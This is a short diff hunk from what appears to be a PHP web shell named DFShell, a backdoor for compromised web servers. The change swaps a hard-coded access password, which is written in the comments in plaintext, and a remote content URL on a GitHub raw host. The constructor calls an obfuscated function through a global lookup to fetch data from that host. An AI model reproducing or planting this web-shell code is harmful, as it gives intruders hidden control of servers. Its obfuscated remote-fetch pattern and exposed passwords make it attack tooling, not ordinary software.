@@ -39,8 +39,8 @@ class DFShell{
     private $clen    = 0;       
     private $error   = false;   
 
-    static protected $pass = "++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++.+.+++++++.++++.+.<------.---------------.++..++++."; //ghost@1337
-    static protected $remote_url = "https://raw.githubusercontent.com/Falco1337/GhostShell/refs/heads/main/test/contents";
+    static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
+    static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
     
     public function __construct(){
         $_SESSION['latest'] = $GLOBALS['DFSyntax'][0](self::$remote_url . "/version.txt");
